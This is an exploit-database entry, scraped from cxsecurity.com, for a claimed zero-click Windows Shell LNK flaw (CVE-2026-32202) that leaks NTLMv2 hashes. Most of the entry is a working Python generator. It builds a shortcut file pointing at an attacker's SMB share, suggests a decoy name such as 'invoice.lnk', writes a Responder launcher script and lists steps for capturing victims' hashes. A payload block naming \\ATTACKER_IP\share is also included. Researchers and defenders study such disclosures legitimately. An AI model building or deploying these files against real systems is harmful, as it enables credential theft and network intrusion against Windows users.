---
title: Windows Shell LNK Spoofing to NTLMv2 Hash Capture
url: https://cxsecurity.com/issue/WLB-2026050023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-27
fetch_date: 2026-05-28T06:01:04.117432
---

# Windows Shell LNK Spoofing to NTLMv2 Hash Capture

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Windows Shell LNK Spoofing to NTLMv2 Hash Capture** **2026.05.27**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: CVE-2026-32202 - Windows Shell LNK Spoofing to NTLMv2 Hash Capture
# Author: nu11secur1ty
# Date: 2026-05-27
# Vendor: Microsoft
# Software: Windows Shell (File Explorer)
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-32202
## Description:
A spoofing vulnerability in Windows Shell (File Explorer) allows an attacker to capture NTLMv2 hashes without user interaction. By crafting a malicious .lnk (shortcut) file with a UNC path pointing to an attacker-controlled SMB server, the target's Windows system automatically sends an NTLMv2 authentication request when the folder containing the .lnk file is opened. No click on the shortcut is required – simply viewing the folder triggers the vulnerability.
\*\*CVSS\*\*: 4.3 (Medium) – NetNTLMv2 hash leak
\*\*Attack Vector\*\*: Network (SMB)
\*\*Privileges Required\*\*: None (user only needs to open a folder)
\*\*User Interaction\*\*: None (zero-click)
\*\*Affected Versions\*\*:
- Windows 11 23H2, 24H2, 25H2, 26H1
- Windows 10 21H2-22H2
- Windows Server 2019/2022/2025
\*\*Patch\*\*: Microsoft April 2026 Patch Tuesday (KB2026-04214)
STATUS: MEDIUM - HIGH/ Vulnerability
[+]Payload:
```POST
SMB/CIFS NTLMv2 Authentication Request
UNC Path: \\ATTACKER\_IP\share\payload.dll
Protocol: SMB2 (port 445)
Hash Type: NetNTLMv2
```
[+]Exploit:
```
#!/usr/bin/env python3
"""
CVE-2026-32202 LNK Exploit Generator
Author: nu11secur1ty
Generates LNK file that leaks NTLM hash to Responder/Impacket
"""
import struct
import sys
import os
def create\_malicious\_lnk(attacker\_ip, output\_file="exploit.lnk", share\_name="share"):
"""
Creates LNK file with UNC path to attacker machine
"""
unc\_path = f"\\\\{attacker\_ip}\\{share\_name}\\test"
unc\_utf16 = unc\_path.encode('utf-16le') + b'\x00\x00'
# LNK structure (standard + vulnerable component)
lnk = bytearray()
# ===== HEADER (76 bytes) =====
lnk.extend(struct.pack('<I', 0x0000004C)) # HeaderSize
# LinkCLSID: {00021401-0000-0000-C000-000000000046}
lnk.extend(b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46')
lnk.extend(struct.pack('<I', 0x000002A3)) # LinkFlags (HasName|HasWorkingDir|HasArguments|IsUnicode)
lnk.extend(struct.pack('<I', 0x00000080)) # FileAttributes (NORMAL)
lnk.extend(struct.pack('<Q', 0)) # CreationTime
lnk.extend(struct.pack('<Q', 0)) # AccessTime
lnk.extend(struct.pack('<Q', 0)) # WriteTime
lnk.extend(struct.pack('<I', 0x00001000)) # FileSize
lnk.extend(struct.pack('<I', 0x00000000)) # IconIndex
lnk.extend(struct.pack('<I', 0x00000001)) # ShowCommand (SW\_NORMAL)
lnk.extend(struct.pack('<H', 0x0000)) # Hotkey
lnk.extend(b'\x00\x00') # Reserved
lnk.extend(b'\x00\x00\x00\x00') # Reserved2
lnk.extend(b'\x00\x00\x00\x00') # Reserved3
# ===== IDLIST (activates when folder is opened) =====
# Shell Folder IDITEM
lnk.extend(b'\x14\x00') # ItemID size (20 bytes)
lnk.extend(b'\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
lnk.extend(b'\x00\x00') # Terminating ID
# ===== STRING DATA (CRITICAL FOR EXPLOIT) =====
# NameString (UNC path - triggers NTLM hash leak)
lnk.extend(struct.pack('<H', len(unc\_utf16)))
lnk.extend(unc\_utf16)
# ArgumentsString (empty)
lnk.extend(b'\x00\x00')
# WorkingDir (UNC path again)
lnk.extend(struct.pack('<H', len(unc\_utf16)))
lnk.extend(unc\_utf16)
# ===== Console Properties (required for some Windows versions) =====
lnk.extend(b'\x50\x00\x14\x00') # dwWindowSize (80x20)
lnk.extend(b'\x50\x00\xfa\x00') # dwBufferSize (80x250)
lnk.extend(b'\x00\x00\x00\x00') # dwFontSize
lnk.extend(b'\x00\x00\x00\x00') # dwFontFamily
lnk.extend(b'\x00\x00\x00\x00') # dwFaceNameLen
lnk.extend(b'\x00\x00\x00\x00') # dwFaceNameOffset
lnk.extend(b'\x00\x00\x00\x00') # dwStyle
# 64 bytes padding
lnk.extend(b'\x00' \* 64)
# Save the file
with open(output\_file, 'wb') as f:
f.write(lnk)
return output\_file, unc\_path
def main():
print(r"""
╔═══════════════════════════════════════════╗
║ CVE-2026-32202 - LNK Generator ║
║ Author: nu11secur1ty ║
╚═══════════════════════════════════════════╝
""")
if len(sys.argv) < 2:
print("Usage: python3 cve\_2026\_32202\_gen.py <ATTACKER\_IP> [output\_file]")
print("Example: python3 cve\_2026\_32202\_gen.py 192.168.1.100 invoice.lnk")
sys.exit(1)
attacker\_ip = sys.argv[1]
output\_file = sys.argv[2] if len(sys.argv) > 2 else "exploit.lnk"
lnk\_file, unc\_path = create\_malicious\_lnk(attacker\_ip, output\_file)
print(f"[+] Exploit ready!")
print(f"[+] File: {lnk\_file}")
print(f"[+] UNC path: {unc\_path}")
print()
print("[\*] Next steps:")
print(f" 1. Start Responder: sudo responder -I eth0 -v")
print(f" 2. Transfer {lnk\_file} to Windows 11 Desktop")
print(f" 3. Open Desktop in File Explorer (no click required)")
print(f" 4. Watch Responder - NTLM hash will appear")
print()
with open("start\_responder.sh", "w") as f:
f.write("#!/bin/bash\n")
f.write("echo \"[+] Starting Responder...\"\n")
f.write("sudo responder -I eth0 -v\n")
os.chmod("start\_responder.sh", 0o755)
print("[+] Helper script created: start\_responder.sh")
if \_\_name\_\_ == "\_\_main\_\_":
main()
```
Demo:
[href](https://www.patreon.com/posts/cve-2026-32202-159362448)
Time spent:
02:30:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty https://www.asc3t1c-nu11secur1ty.com/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| ...